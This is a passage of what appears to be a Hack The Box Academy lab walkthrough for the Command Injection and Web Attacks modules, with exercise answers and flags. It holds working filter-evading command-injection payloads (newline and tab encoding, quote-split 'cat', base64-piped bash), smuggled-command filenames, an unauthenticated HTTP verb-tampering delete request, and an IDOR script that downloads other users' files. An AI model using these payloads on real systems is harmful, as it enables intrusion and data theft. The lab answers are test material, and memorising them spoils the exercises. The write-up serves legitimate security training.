<p><strong>Try using the remaining three injection operators (new-line, &amp;, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-411-1">1</a></span>
<span class="normal"><a href="#__codelineno-411-2">2</a></span>
<span class="normal"><a href="#__codelineno-411-3">3</a></span>
<span class="normal"><a href="#__codelineno-411-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-411-1"><a id="__codelineno-411-1" name="__codelineno-411-1"></a><span class="c1"># After trying the three of them:</span>
</span><span id="__span-411-2"><a id="__codelineno-411-2" name="__codelineno-411-2"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1+<span class="p">|</span>+whoami
</span><span id="__span-411-3"><a id="__codelineno-411-3" name="__codelineno-411-3"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="se">\n</span>whoami
</span><span id="__span-411-4"><a id="__codelineno-411-4" name="__codelineno-411-4"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1+<span class="p">&amp;</span>+whoami
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>|</code></p>
<h3 id="filter-evasion">Filter Evasion</h3>
<p><strong>Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &amp;, |) is not blacklisted by the web application?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-412-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-412-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-412-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-412-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-412-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-412-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-412-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-412-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-412-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-412-10">10</a></span>
<span class="normal"><a href="#__codelineno-412-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-412-1"><a id="__codelineno-412-1" name="__codelineno-412-1"></a><span class="c1"># Use url-encoded character for new line</span>
</span><span id="__span-412-2"><a id="__codelineno-412-2" name="__codelineno-412-2"></a>%0a
</span><span id="__span-412-3"><a id="__codelineno-412-3" name="__codelineno-412-3"></a>
</span><span id="__span-412-4"><a id="__codelineno-412-4" name="__codelineno-412-4"></a><span class="c1"># As &#39;whoami&#39; is being filtered, as single quotes are being removed, use:</span>
</span><span id="__span-412-5"><a id="__codelineno-412-5" name="__codelineno-412-5"></a>whoam<span class="s1">&#39;i</span>
</span><span id="__span-412-6"><a id="__codelineno-412-6" name="__codelineno-412-6"></a>
</span><span id="__span-412-7"><a id="__codelineno-412-7" name="__codelineno-412-7"></a><span class="s1"># As blank spaces are being removed, user an url-encoded expression for TAB</span>
</span><span id="__span-412-8"><a id="__codelineno-412-8" name="__codelineno-412-8"></a><span class="s1">%09</span>
</span><span id="__span-412-9"><a id="__codelineno-412-9" name="__codelineno-412-9"></a>
</span><span id="__span-412-10"><a id="__codelineno-412-10" name="__codelineno-412-10"></a><span class="s1"># All together</span>
</span><span id="__span-412-11"><a id="__codelineno-412-11" name="__codelineno-412-11"></a><span class="s1">ip=127.0.0.1%0a%09whoam&#39;</span>i
</span></code></pre></div></td></tr></table></div>
<p>Results: new-line</p>
<p><strong>Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-413-1">1</a></span>
<span class="normal"><a href="#__codelineno-413-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-413-1"><a id="__codelineno-413-1" name="__codelineno-413-1"></a><span class="c1"># We enter as input</span>
</span><span id="__span-413-2"><a id="__codelineno-413-2" name="__codelineno-413-2"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1%0a<span class="o">{</span>ls,-la<span class="o">}</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: 1613</p>
<p><strong>Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-414-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-414-1"><a id="__codelineno-414-1" name="__codelineno-414-1"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1%0a%09ls%09<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>home
</span></code></pre></div></td></tr></table></div>
<p><strong>Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-415-1">1</a></span>
<span class="normal"><a href="#__codelineno-415-2">2</a></span>
<span class="normal"><a href="#__codelineno-415-3">3</a></span>
<span class="normal"><a href="#__codelineno-415-4">4</a></span>
<span class="normal"><a href="#__codelineno-415-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-415-1"><a id="__codelineno-415-1" name="__codelineno-415-1"></a><span class="c1"># First we list the directory</span>
</span><span id="__span-415-2"><a id="__codelineno-415-2" name="__codelineno-415-2"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1%0a%09ls%09<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>home<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>1nj3c70r
</span><span id="__span-415-3"><a id="__codelineno-415-3" name="__codelineno-415-3"></a>
</span><span id="__span-415-4"><a id="__codelineno-415-4" name="__codelineno-415-4"></a><span class="c1"># Now we print the flag.txt. As cat command is blacklisted we will use doble quotes to bypass the restriction. We will use the environmental variable PATH to print /</span>
</span><span id="__span-415-5"><a id="__codelineno-415-5" name="__codelineno-415-5"></a><span class="m">127</span>.0.0.1%0a%09<span class="s2">&quot;ca&quot;</span>t%09<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>home<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>1nj3c70r<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{b451c_f1l73r5_w0n7_570p_m3}</p>
<p><strong>Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-416-1">1</a></span>
<span class="normal"><a href="#__codelineno-416-2">2</a></span>
<span class="normal"><a href="#__codelineno-416-3">3</a></span>
<span class="normal"><a href="#__codelineno-416-4">4</a></span>
<span class="normal"><a href="#__codelineno-416-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-416-1"><a id="__codelineno-416-1" name="__codelineno-416-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;find /usr/share/ | grep root | grep mysql | tail -n 1&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
</span><span id="__span-416-2"><a id="__codelineno-416-2" name="__codelineno-416-2"></a><span class="c1"># Output:</span>
</span><span id="__span-416-3"><a id="__codelineno-416-3" name="__codelineno-416-3"></a><span class="c1"># ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=</span>
</span><span id="__span-416-4"><a id="__codelineno-416-4" name="__codelineno-416-4"></a>
</span><span id="__span-416-5"><a id="__codelineno-416-5" name="__codelineno-416-5"></a><span class="m">127</span>.0.0.1%0abash<span class="o">&lt;&lt;&lt;</span><span class="k">$(</span>base64%09-d<span class="o">&lt;&lt;&lt;</span><span class="nv">ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE</span><span class="o">=</span><span class="k">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: /usr/share/mysql/debian_create_root_user.sql</p>
<h3 id="skills-assessment_7">Skills Assessment</h3>
<p>You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.</p>
<p>Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.</p>
<p><strong>Authenticate to with user "guest" and password "guest". What is the content of '/flag.txt'?</strong></p>
<p>Move feature: </p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-417-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-417-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-417-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-417-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-417-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-417-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-417-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-417-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-417-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-417-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-417-1"><a id="__codelineno-417-1" name="__codelineno-417-1"></a>GET<span class="w"> </span>/index.php?to<span class="o">=</span><span class="p">&amp;</span><span class="nv">from</span><span class="o">=</span><span class="m">696212415</span>.txt<span class="se">\\\n</span>%09%60<span class="s1">&#39;c&#39;</span>at%09<span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>flag.txt%60<span class="p">&amp;</span><span class="nv">finish</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">move</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>HTTP/1.1
</span><span id="__span-417-2"><a id="__codelineno-417-2" name="__codelineno-417-2"></a>Host:<span class="w"> </span><span class="m">94</span>.237.50.242:34291
</span><span id="__span-417-3"><a id="__codelineno-417-3" name="__codelineno-417-3"></a>User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:109.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/115.0
</span><span id="__span-417-4"><a id="__codelineno-417-4" name="__codelineno-417-4"></a>Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,image/avif,image/webp,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
</span><span id="__span-417-5"><a id="__codelineno-417-5" name="__codelineno-417-5"></a>Accept-Language:<span class="w"> </span>en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5
</span><span id="__span-417-6"><a id="__codelineno-417-6" name="__codelineno-417-6"></a>Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate,<span class="w"> </span>br
</span><span id="__span-417-7"><a id="__codelineno-417-7" name="__codelineno-417-7"></a>Connection:<span class="w"> </span>keep-alive
</span><span id="__span-417-8"><a id="__codelineno-417-8" name="__codelineno-417-8"></a>Referer:<span class="w"> </span>http://94.237.50.242:34291/index.php?to<span class="o">=</span><span class="p">&amp;</span><span class="nv">from</span><span class="o">=</span><span class="m">696212415</span>.txt
</span><span id="__span-417-9"><a id="__codelineno-417-9" name="__codelineno-417-9"></a>Cookie:<span class="w"> </span><span class="nv">filemanager</span><span class="o">=</span>pni25scv3jtjvsf311dmj1b6o7
</span><span id="__span-417-10"><a id="__codelineno-417-10" name="__codelineno-417-10"></a>Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{c0mm4nd3r_1nj3c70r}</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-418-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-418-1"><a id="__codelineno-418-1" name="__codelineno-418-1"></a>
</span></code></pre></div></td></tr></table></div>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-419-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-419-1"><a id="__codelineno-419-1" name="__codelineno-419-1"></a>
</span></code></pre></div></td></tr></table></div>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-420-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-420-1"><a id="__codelineno-420-1" name="__codelineno-420-1"></a>
</span></code></pre></div></td></tr></table></div>
<h2 id="web-attacks"><a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a></h2>
<h3 id="http-verb-tampering">HTTP Verb Tampering</h3>
<p><strong>Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.</strong></p>
<p>We access the website. Observe the Reset feature that triggers this request:</p>
<div class="language-HTML highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-421-1">1</a></span>
<span class="normal"><a href="#__codelineno-421-2">2</a></span>
<span class="normal"><a href="#__codelineno-421-3">3</a></span>
<span class="normal"><a href="#__codelineno-421-4">4</a></span>
<span class="normal"><a href="#__codelineno-421-5">5</a></span>
<span class="normal"><a href="#__codelineno-421-6">6</a></span>
<span class="normal"><a href="#__codelineno-421-7">7</a></span>
<span class="normal"><a href="#__codelineno-421-8">8</a></span>
<span class="normal"><a href="#__codelineno-421-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-421-1"><a id="__codelineno-421-1" name="__codelineno-421-1"></a>GET /admin/reset.php? HTTP/1.1
</span><span id="__span-421-2"><a id="__codelineno-421-2" name="__codelineno-421-2"></a>Host: 94.237.54.42:42078
</span><span id="__span-421-3"><a id="__codelineno-421-3" name="__codelineno-421-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-421-4"><a id="__codelineno-421-4" name="__codelineno-421-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-421-5"><a id="__codelineno-421-5" name="__codelineno-421-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-421-6"><a id="__codelineno-421-6" name="__codelineno-421-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-421-7"><a id="__codelineno-421-7" name="__codelineno-421-7"></a>Connection: keep-alive
</span><span id="__span-421-8"><a id="__codelineno-421-8" name="__codelineno-421-8"></a>Referer: http://94.237.54.42:42078/
</span><span id="__span-421-9"><a id="__codelineno-421-9" name="__codelineno-421-9"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>There is a modal asking for Basic Authentication, meaning that, at least GET /admin endpoint is protected by authentication. However we can trick the server by requesting the deletion of the file directly with: </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-422-1">1</a></span>
<span class="normal"><a href="#__codelineno-422-2">2</a></span>
<span class="normal"><a href="#__codelineno-422-3">3</a></span>
<span class="normal"><a href="#__codelineno-422-4">4</a></span>
<span class="normal"><a href="#__codelineno-422-5">5</a></span>
<span class="normal"><a href="#__codelineno-422-6">6</a></span>
<span class="normal"><a href="#__codelineno-422-7">7</a></span>
<span class="normal"><a href="#__codelineno-422-8">8</a></span>
<span class="normal"><a href="#__codelineno-422-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-422-1"><a id="__codelineno-422-1" name="__codelineno-422-1"></a>DEL /admin/reset.php?notes.txt HTTP/1.1
</span><span id="__span-422-2"><a id="__codelineno-422-2" name="__codelineno-422-2"></a>Host: 94.237.54.42:42078
</span><span id="__span-422-3"><a id="__codelineno-422-3" name="__codelineno-422-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-422-4"><a id="__codelineno-422-4" name="__codelineno-422-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-422-5"><a id="__codelineno-422-5" name="__codelineno-422-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-422-6"><a id="__codelineno-422-6" name="__codelineno-422-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-422-7"><a id="__codelineno-422-7" name="__codelineno-422-7"></a>Connection: keep-alive
</span><span id="__span-422-8"><a id="__codelineno-422-8" name="__codelineno-422-8"></a>Referer: http://94.237.54.42:42078/index.php
</span><span id="__span-422-9"><a id="__codelineno-422-9" name="__codelineno-422-9"></a>Upgrade-Insecure-Requests: 1
</span></code></pre></div></td></tr></table></div>
<p>Flag is showcased after that. Results: HTB{4lw4y5_c0v3r_4ll_v3rb5}</p>
<p><strong>To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-423-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-423-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-423-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-423-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-423-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-423-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-423-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-423-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-423-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-423-10">10</a></span>
<span class="normal"><a href="#__codelineno-423-11">11</a></span>
<span class="normal"><a href="#__codelineno-423-12">12</a></span>
<span class="normal"><a href="#__codelineno-423-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-423-1"><a id="__codelineno-423-1" name="__codelineno-423-1"></a>POST /index.php HTTP/1.1
</span><span id="__span-423-2"><a id="__codelineno-423-2" name="__codelineno-423-2"></a>Host: 94.237.54.116:49636
</span><span id="__span-423-3"><a id="__codelineno-423-3" name="__codelineno-423-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-423-4"><a id="__codelineno-423-4" name="__codelineno-423-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-423-5"><a id="__codelineno-423-5" name="__codelineno-423-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-423-6"><a id="__codelineno-423-6" name="__codelineno-423-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-423-7"><a id="__codelineno-423-7" name="__codelineno-423-7"></a>Connection: keep-alive
</span><span id="__span-423-8"><a id="__codelineno-423-8" name="__codelineno-423-8"></a>Referer: http://94.237.54.116:49636/
</span><span id="__span-423-9"><a id="__codelineno-423-9" name="__codelineno-423-9"></a>Upgrade-Insecure-Requests: 1
</span><span id="__span-423-10"><a id="__codelineno-423-10" name="__codelineno-423-10"></a>Content-type: application/x-www-form-urlencoded
</span><span id="__span-423-11"><a id="__codelineno-423-11" name="__codelineno-423-11"></a>Content-Length: 28
</span><span id="__span-423-12"><a id="__codelineno-423-12" name="__codelineno-423-12"></a>
</span><span id="__span-423-13"><a id="__codelineno-423-13" name="__codelineno-423-13"></a>filename=one;cp+/flag.txt+./
</span></code></pre></div></td></tr></table></div>
<p>Now access to http://94.237.54.116:49636/flag.txt
Results: HTB{b3_v3rb_c0n51573n7}</p>
<h3 id="insecure-direct-object-references-idor">Insecure Direct Object References (IDOR)</h3>
<p><strong>Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.</strong></p>
<p>We can run an intruder attack, being the payload the uid parameter. Finally, this payload will return a txt file</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-424-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-424-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-424-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-424-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-424-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-424-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-424-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-424-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-424-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-424-10">10</a></span>
<span class="normal"><a href="#__codelineno-424-11">11</a></span>
<span class="normal"><a href="#__codelineno-424-12">12</a></span>
<span class="normal"><a href="#__codelineno-424-13">13</a></span>
<span class="normal"><a href="#__codelineno-424-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-424-1"><a id="__codelineno-424-1" name="__codelineno-424-1"></a>POST /documents.php HTTP/1.1
</span><span id="__span-424-2"><a id="__codelineno-424-2" name="__codelineno-424-2"></a>Host: 94.237.54.116:37509
</span><span id="__span-424-3"><a id="__codelineno-424-3" name="__codelineno-424-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-424-4"><a id="__codelineno-424-4" name="__codelineno-424-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span><span id="__span-424-5"><a id="__codelineno-424-5" name="__codelineno-424-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-424-6"><a id="__codelineno-424-6" name="__codelineno-424-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-424-7"><a id="__codelineno-424-7" name="__codelineno-424-7"></a>Content-Type: application/x-www-form-urlencoded
</span><span id="__span-424-8"><a id="__codelineno-424-8" name="__codelineno-424-8"></a>Content-Length: 6
</span><span id="__span-424-9"><a id="__codelineno-424-9" name="__codelineno-424-9"></a>Origin: http://94.237.54.116:37509
</span><span id="__span-424-10"><a id="__codelineno-424-10" name="__codelineno-424-10"></a>Connection: keep-alive
</span><span id="__span-424-11"><a id="__codelineno-424-11" name="__codelineno-424-11"></a>Referer: http://94.237.54.116:37509/
</span><span id="__span-424-12"><a id="__codelineno-424-12" name="__codelineno-424-12"></a>Upgrade-Insecure-Requests: 1
</span><span id="__span-424-13"><a id="__codelineno-424-13" name="__codelineno-424-13"></a>
</span><span id="__span-424-14"><a id="__codelineno-424-14" name="__codelineno-424-14"></a>uid=15
</span></code></pre></div></td></tr></table></div>
<p>Accessing the http://94.237.54.116:37509/documents/flag_11dfa168ac8eb2958e38425728623c98.txt returns the flag.</p>
<p>Also we can do a script that retrieves all files of users 1 to 20</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-425-1">1</a></span>
<span class="normal"><a href="#__codelineno-425-2">2</a></span>
<span class="normal"><a href="#__codelineno-425-3">3</a></span>
<span class="normal"><a href="#__codelineno-425-4">4</a></span>
<span class="normal"><a href="#__codelineno-425-5">5</a></span>
<span class="normal"><a href="#__codelineno-425-6">6</a></span>
<span class="normal"><a href="#__codelineno-425-7">7</a></span>
<span class="normal"><a href="#__codelineno-425-8">8</a></span>
<span class="normal"><a href="#__codelineno-425-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-425-1"><a id="__codelineno-425-1" name="__codelineno-425-1"></a><span class="ch">#!/bin/bash</span>
</span><span id="__span-425-2"><a id="__codelineno-425-2" name="__codelineno-425-2"></a>
</span><span id="__span-425-3"><a id="__codelineno-425-3" name="__codelineno-425-3"></a><span class="nv">url</span><span class="o">=</span><span class="s2">&quot;http://SERVER_IP:PORT&quot;</span>
</span><span id="__span-425-4"><a id="__codelineno-425-4" name="__codelineno-425-4"></a>
</span><span id="__span-425-5"><a id="__codelineno-425-5" name="__codelineno-425-5"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..20<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-425-6"><a id="__codelineno-425-6" name="__codelineno-425-6"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span>link<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$url</span><span class="s2">/documents.php?uid=</span><span class="nv">$i</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s2">&quot;\/documents.*?.pdf&quot;</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-425-7"><a id="__codelineno-425-7" name="__codelineno-425-7"></a><span class="w">                </span>wget<span class="w"> </span>-q<span class="w"> </span><span class="nv">$url</span>/<span class="nv">$link</span>
</span><span id="__span-425-8"><a id="__codelineno-425-8" name="__codelineno-425-8"></a><span class="w">        </span><span class="k">done</span>
</span><span id="__span-425-9"><a id="__codelineno-425-9" name="__codelineno-425-9"></a><span class="k">done</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{4ll_f1l35_4r3_m1n3}</p>
<p><strong>Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.</strong></p>
<p>After visiting the source code for the response to the request <code>GET /contracts.php HTTP/1.1</code>  we notice the following function:</p>
<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-426-1">1</a></span>
<span class="normal"><a href="#__codelineno-426-2">2</a></span>
<span class="normal"><a href="#__codelineno-426-3">3</a></span>
<span class="normal"><a href="#__codelineno-426-4">4</a></span>
<span class="normal"><a href="#__codelineno-426-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-426-1"><a id="__codelineno-426-1" name="__codelineno-426-1"></a><span class="w"> </span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span id="__span-426-2"><a id="__codelineno-426-2" name="__codelineno-426-2"></a><span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">downloadContract</span><span class="p">(</span><span class="nx">uid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-426-3"><a id="__codelineno-426-3" name="__codelineno-426-3"></a><span class="w">      </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`/download.php?contract=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">uid</span><span class="p">))</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
</span><span id="__span-426-4"><a id="__codelineno-426-4" name="__codelineno-426-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-426-5"><a id="__codelineno-426-5" name="__codelineno-426-5"></a><span class="w">  </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>The expression <code>${encodeURIComponent(btoa(uid))}</code> performs the following operations: </p>
<ol>
<li>
<p><strong><code>btoa(uid)</code></strong>:</p>
</li>
<li>
<p>The <code>btoa()</code> function encodes a string to <strong>Base64</strong>.</p>
</li>
<li><code>uid</code> is a variable or value representing the input string.</li>
<li>
<p><strong>Example</strong>: If <code>uid = "user123"</code>, then <code>btoa(uid)</code> will return <code>"dXNlcjEyMw=="</code>.</p>
</li>
<li>
<p><strong><code>encodeURIComponent(...)</code></strong>:</p>
</li>
<li>
<p>The <code>encodeURIComponent()</code> function encodes a URI component by escaping characters that have special meanings in a URI (e.g., <code>&amp;</code>, <code>=</code>, <code>/</code>, etc.).</p>
</li>
<li>It ensures the Base64-encoded string is safe for use in URLs.</li>
</ol>
<p>We can now perform an Intruder attack with the following request</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-427-1">1</a></span>
<span class="normal"><a href="#__codelineno-427-2">2</a></span>
<span class="normal"><a href="#__codelineno-427-3">3</a></span>
<span class="normal"><a href="#__codelineno-427-4">4</a></span>
<span class="normal"><a href="#__codelineno-427-5">5</a></span>
